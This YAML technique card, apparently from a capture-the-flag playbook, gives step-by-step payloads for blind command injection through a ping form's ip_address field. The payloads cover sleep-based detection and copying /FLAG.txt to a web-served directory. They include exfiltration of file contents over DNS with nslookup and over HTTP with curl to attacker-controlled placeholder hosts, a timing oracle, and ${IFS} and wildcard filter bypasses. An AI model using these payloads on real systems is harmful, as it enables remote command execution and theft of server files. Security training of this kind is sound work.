name: blind_command_injection
category: web
tags: [command_injection, blind, subprocess, shell]
indicators:
  - "subprocess.Popen"
  - "shell=True"
  - "command concatenation"
  - "filtered output"

tricks:
  - name: "Step 1: Discover ping functionality"
    when: "Found command execution feature"
    how: "Test normal usage, observe behavior"
    payload: |
      POST /ping
      ip_address=8.8.8.8
      # Response: "Host is reachable!"

  - name: "Step 2: Test command injection"
    when: "Suspect command injection"
    how: "Try command separators"
    payload: |
      ip_address=8.8.8.8; sleep 5
      # Response delayed 5 seconds! Command executed
      # Conclusion: blind command injection (output filtered)

  - name: "Step 3: Exfiltrate via file"
    when: "Found static directory"
    how: "Copy flag to accessible location"
    payload: |
      ip_address=8.8.8.8; cp /FLAG.txt /app/static/out.txt
      curl http://localhost/static/out.txt
      # Flag retrieved!

  - name: "Alternative: DNS exfiltration"
    when: "Have your own domain"
    how: "Exfiltrate via DNS query"
    payload: |
      ip_address=8.8.8.8; nslookup $(cat /FLAG.txt).your-domain.com

  - name: "Alternative: HTTP exfiltration"
    when: "Have your own server"
    how: "Use curl to send data"
    payload: |
      ip_address=8.8.8.8; curl http://your-server.com/?d=$(cat /FLAG.txt)

  - name: "Alternative: Time-based blind"
    when: "Cannot exfiltrate data"
    how: "Character-by-character via delay"
    payload: |
      ip_address=8.8.8.8; [ $(cat /FLAG.txt | cut -c1) = 'F' ] && sleep 3

  - name: "Bypass filters"
    when: "Some characters filtered"
    how: "Use alternative methods"
    payload: |
      # Space filtered -> use ${IFS}
      8.8.8.8;cat${IFS}/FLAG.txt
      
      # Keyword filtered -> use wildcards
      8.8.8.8;cat${IFS}/FL*

